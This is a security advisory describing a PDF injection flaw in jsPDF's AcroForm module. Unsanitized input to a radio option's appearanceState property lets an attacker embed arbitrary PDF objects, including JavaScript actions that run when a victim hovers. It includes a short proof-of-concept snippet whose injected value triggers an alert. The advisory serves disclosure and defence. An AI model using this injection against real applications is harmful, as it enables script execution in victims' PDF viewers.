title: "jsPDF has a PDF Injection in AcroForm module allows Arbitrary JavaScript Execution
  (RadioButton.createOption and \"AS\" property)"
description: "User control of properties and methods of the Acroform module allows
  users to inject arbitrary PDF objects, such as JavaScript actions.\n\nIf given the
  possibility to pass unsanitized input to one of the following property, a user can
  inject arbitrary PDF objects, such as JavaScript actions, which are executed when
  the victim hovers over the radio option.\n\n* `AcroformChildClass.appearanceState`\n\nExample
  attack vector:\n\n```js\nimport { jsPDF } from \"jspdf\"\nconst doc = new jsPDF();\n\nconst
  group = new doc.AcroFormRadioButton();\ngroup.x = 10; group.y = 10; group.width
  = 20; group.height = 10;\ndoc.addField(group);\n\nconst child = group.createOption(\"opt1\");\nchild.x
  = 10; child.y = 10; child.width = 20; child.height = 10;\nchild.appearanceState
  = \"Off /AA << /E << /S /JavaScript /JS (app.alert('XSS')) >> >>\";\n\ndoc.save(\"test.pdf\");\n```"
